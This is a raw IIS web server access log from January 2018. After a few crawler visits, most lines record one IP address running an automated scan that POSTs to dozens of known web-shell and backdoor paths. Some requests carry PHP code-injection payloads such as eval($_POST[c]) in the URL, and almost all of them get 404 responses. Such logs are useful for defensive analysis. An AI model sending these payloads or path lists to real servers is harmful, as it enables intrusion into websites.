#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-01-24 07:42:11
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-01-24 07:42:11 GET / - 13.56.229.65 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_6)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/61.0.3163.100+Safari/537.36 - 200 8209 207
2018-01-24 16:19:53 GET / - 66.249.79.157 HTTP/1.1 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 200 8209 300
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-01-24 17:50:36
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-01-24 17:50:36 GET /robots.txt - 207.46.13.198 HTTP/1.1 Mozilla/5.0+(compatible;+bingbot/2.0;++http://www.bing.com/bingbot.htm) - 404 1405 252
2018-01-24 17:50:39 GET / - 207.46.13.141 HTTP/1.1 Mozilla/5.0+(compatible;+bingbot/2.0;++http://www.bing.com/bingbot.htm) - 200 8209 274
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-01-24 20:21:13
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-01-24 20:21:13 GET / - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz 200 34836 256
2018-01-24 20:21:13 POST /code/mp.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/code/mp.php 404 1405 645
2018-01-24 20:21:14 POST /include/data/fonts/uddatasql.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/include/data/fonts/uddatasql.php 404 1405 694
2018-01-24 20:21:14 POST /weki.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/weki.php 404 1405 639
2018-01-24 20:21:14 POST /md5.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/md5.asp 404 1405 293
2018-01-24 20:21:18 POST /images/swfupload/images/uploadye.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/images/swfupload/images/uploadye.php 404 0 702
2018-01-24 20:21:18 POST /dxyylc/md5.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/dxyylc/md5.php 404 1405 650
2018-01-24 20:21:18 POST /ckeditor/plugins/pagebreak/images/inCahe.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/ckeditor/plugins/pagebreak/images/inCahe.php 404 1405 716
2018-01-24 20:21:19 POST /plus/sky.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/sky.php 404 1405 646
2018-01-24 20:21:19 POST /lent.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/lent.php 404 1405 295
2018-01-24 20:21:22 POST /plus/e7xue.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/e7xue.php 404 0 654
2018-01-24 20:21:22 POST /plus/laobiao.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/laobiao.php 404 1405 654
2018-01-24 20:21:24 POST /plus/mytag_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=8080 404 1405 678
2018-01-24 20:21:24 POST /plus/mytag_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=8080 404 1405 1132
2018-01-24 20:21:25 POST /plus/mytag_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=8080 404 1405 681
2018-01-24 20:21:25 POST /90.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/90.asp 404 1405 291
2018-01-24 20:21:27 POST /install/modurnlecscache.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/install/modurnlecscache.php 404 1405 684
2018-01-24 20:21:27 POST /dxyylc/md5.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/dxyylc/md5.asp 404 1405 307
2018-01-24 20:21:29 POST /images/class.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/images/class.asp 404 1405 1111
2018-01-24 20:21:29 POST /utility/convert/data/config.inc.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/utility/convert/data/config.inc.php 404 1405 692
2018-01-24 20:21:29 POST /wap/wap.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/wap/wap.php 404 1405 647
2018-01-24 20:21:30 POST /plus/90sec.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/90sec.php 404 1405 654
2018-01-24 20:21:30 POST /wap/wap.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/wap/wap.asp 404 1405 1101
2018-01-24 20:21:30 POST /test.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/test.php 404 1405 638
2018-01-24 20:21:31 POST /login_wall.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/login_wall.php?login=cmd 404 1405 673
2018-01-24 20:21:31 POST /login_wall.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/login_wall.php?login=cmd 404 1405 1127
2018-01-24 20:21:31 POST /login_wall.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/login_wall.php?login=cmd 404 1405 327
2018-01-24 20:21:32 POST /images/class.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/images/class.php 404 1405 657
2018-01-24 20:21:32 POST /data/404test.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/404test.php 404 1405 655
2018-01-24 20:21:32 POST /11m.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/11m.php 404 1405 293
2018-01-24 20:21:33 POST /1.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/1.php 404 1405 632
2018-01-24 20:21:33 POST /plus/90sec.php/plus/90sec.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/90sec.php/plus/90sec.php 404 1405 684
2018-01-24 20:21:33 POST /languages/zh_cn/convert/shopex49.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/languages/zh_cn/convert/shopex49.php?license_id=assert 404 1405 742
2018-01-24 20:21:34 POST /languages/zh_cn/convert/shopex49.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/languages/zh_cn/convert/shopex49.php?license_id=assert 404 1405 1196
2018-01-24 20:21:34 POST /languages/zh_cn/convert/shopex49.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/languages/zh_cn/convert/shopex49.php?license_id=assert 404 1405 745
2018-01-24 20:21:34 POST /data/config_data.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/config_data.php 404 1405 662
2018-01-24 20:21:34 POST /2016/gou.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/2016/gou.php 404 1405 303
2018-01-24 20:21:39 POST /i.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/i.php 404 1405 633
2018-01-24 20:21:42 POST /plus/ad_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/ad_js.php?aid=9090 404 1405 1126
2018-01-24 20:21:42 POST /plus/ad_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/ad_js.php?aid=9090 404 1405 675
2018-01-24 20:21:42 POST /api/newfile.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/api/newfile.php? 404 1405 654
2018-01-24 20:21:42 POST /api/newfile.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/api/newfile.php? 404 1405 311
2018-01-24 20:21:45 POST /api/newfile.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/api/newfile.php? 404 1405 657
2018-01-24 20:21:45 POST /plus/mytag_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=9527 404 1405 679
2018-01-24 20:21:45 POST /plus/mytag_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=9527 404 1405 1133
2018-01-24 20:21:46 POST /plus/mytag_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=9527 404 1405 682
2018-01-24 20:21:46 POST /index.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php 404 1405 640
2018-01-24 20:21:46 POST /index.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D 404 1405 750
2018-01-24 20:21:46 POST /index.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D 404 1405 1204
2018-01-24 20:21:47 POST /index.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D 404 1405 753
2018-01-24 20:21:47 POST /fuck.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/fuck.php 404 1405 641
2018-01-24 20:21:48 POST /cache/cachee.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/cache/cachee.php 404 1405 311
2018-01-24 20:21:48 POST /yp/product.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/yp/product.php?pagesize=${${@eval%28$_POST[-62]%29}} 404 1405 728
2018-01-24 20:21:48 POST /yp/product.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/yp/product.php?pagesize=${${@eval%28$_POST[-62]%29}} 404 1405 1182
2018-01-24 20:21:48 POST /yp/product.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/yp/product.php?pagesize=${${@eval%28$_POST[-62]%29}} 404 1405 731
2018-01-24 20:21:49 POST /About/newfile.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/About/newfile.php 404 1405 656
2018-01-24 20:21:49 POST /include/data/words/words.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/include/data/words/words.php 404 1405 335
2018-01-24 20:21:50 POST /plus/mytag_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=6022 404 1405 674
2018-01-24 20:21:50 POST /plus/mytag_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=6022 404 1405 1128
2018-01-24 20:21:51 POST /plus/mytag_js.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=6022 404 1405 331
2018-01-24 20:21:51 POST /index.php/Index/index/name/${@eval($_POST[c])} - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php/Index/index/name/${@eval($_POST[c])} 404 1405 722
2018-01-24 20:21:51 POST /index.php/Index/index/name/${@eval($_POST[c])} - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php/Index/index/name/${@eval($_POST[c])} 404 1405 1176
2018-01-24 20:21:51 POST /index.php/Index/index/name/${@eval($_POST[c])} - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php/Index/index/name/${@eval($_POST[c])} 404 1405 725
2018-01-24 20:21:52 POST /test.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/test.php 404 1405 641
2018-01-24 20:21:52 POST /news/2016/gou.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/news/2016/gou.php 404 1405 661
2018-01-24 20:21:52 POST /data/#data.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/%23data.asp 404 1405 1108
2018-01-24 20:21:52 POST /SqlIn.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/SqlIn.asp 404 1405 1094
2018-01-24 20:21:53 POST /SqlOut.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/SqlOut.asp 404 1405 299
2018-01-24 20:21:53 POST /data/data.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/data.asp 404 1405 1102
2018-01-24 20:21:54 POST /css.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/css.asp 404 1405 1092
2018-01-24 20:21:54 POST /config/AspCms_Config.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/config/AspCms_Config.asp 404 1405 1124
2018-01-24 20:21:55 POST /inc/config.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/inc/config.asp 404 1405 1104
2018-01-24 20:21:56 POST /9tu.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/9tu.asp 404 1405 1094
2018-01-24 20:21:56 POST /11m.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/11m.asp 404 1405 1092
2018-01-24 20:21:56 POST /admin/index.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/admin/index.asp 404 1405 1107
2018-01-24 20:21:56 POST /conn1.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/conn1.asp 404 1405 1098
2018-01-24 20:21:57 POST /concon.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/concon.asp 404 1405 299
2018-01-24 20:21:57 POST /UploadFile/index.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/UploadFile/index.asp 404 1405 1116
2018-01-24 20:21:58 POST /bsm.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/bsm.asp 404 1405 1093
2018-01-24 20:21:58 POST /inc/config.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/inc/config.asp 404 1405 1108
2018-01-24 20:21:58 POST /admin/Databackup/1.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/admin/Databackup/1.asp 404 1405 1120
2018-01-24 20:21:58 POST /images/img.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/images/img.asp 404 1405 1106
2018-01-24 20:21:59 POST /inc/myql.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/inc/myql.asp 404 1405 303
2018-01-24 20:22:01 POST /a.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/a.asp 404 1405 1086
2018-01-24 20:22:01 POST /Images/cache.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/Images/cache.asp 404 1405 1114
2018-01-24 20:22:01 POST /css/css.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/css/css.asp 404 1405 301
2018-01-24 20:22:04 POST /inc/config.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/inc/config.asp 404 1405 1105
2018-01-24 20:22:04 POST /jiuge.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/jiuge.asp 404 1405 297
2018-01-24 20:22:06 POST /ver.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/ver.asp 404 1405 1090
2018-01-24 20:22:06 POST /Templates/red.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/Templates/red.asp 404 1405 313
2018-01-24 20:22:07 POST /config/AspCms_Config.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/config/AspCms_Config.asp 404 1405 1124
2018-01-24 20:22:12 POST /struts2-showcase/filedownload/index.action - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/struts2-showcase/filedownload/index.action 404 1405 363
2018-01-24 20:22:15 POST /info1.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/info1.php 404 1405 640
2018-01-24 20:22:15 POST /index.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.asp 404 1405 297
2018-01-24 20:22:20 POST /UserFiles/x.aspx - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/UserFiles/x.aspx 500 3266 1111
2018-01-24 20:22:20 POST /UserFiles/x.aspx - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/UserFiles/x.aspx 500 3266 660
2018-01-24 20:22:21 POST /Images/MyFiles/x.aspx - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/Images/MyFiles/x.aspx 500 3266 667
2018-01-24 20:22:21 POST /Images/MyFiles/x.aspx - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/Images/MyFiles/x.aspx 500 3266 1121
2018-01-24 20:22:21 POST /Images/MyFiles/x.aspx - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/Images/MyFiles/x.aspx 500 3266 670
2018-01-24 20:22:22 POST /utility/convert/data/config.inc.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/utility/convert/data/config.inc.php 404 1405 694
2018-01-24 20:22:25 POST /data/cache/fuck.php.parse_search_.inc - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/cache/fuck.php.parse_search_.inc 404 1405 353
2018-01-24 20:22:29 POST /data/cache/fuck.php.parse_search_.inc - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/cache/fuck.php.parse_search_.inc 404 1405 699
2018-01-24 20:22:32 POST /config/AspCms_Config.asp - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/config/AspCms_Config.asp 404 1405 1126
2018-01-24 20:22:32 POST /admin/uploadfiles/Hzllaga_Getshell.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/admin/uploadfiles/Hzllaga_Getshell.php 404 1405 703
2018-01-24 20:22:35 POST /plus/moon.php - 119.27.180.200 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/moon.php 404 1405 648
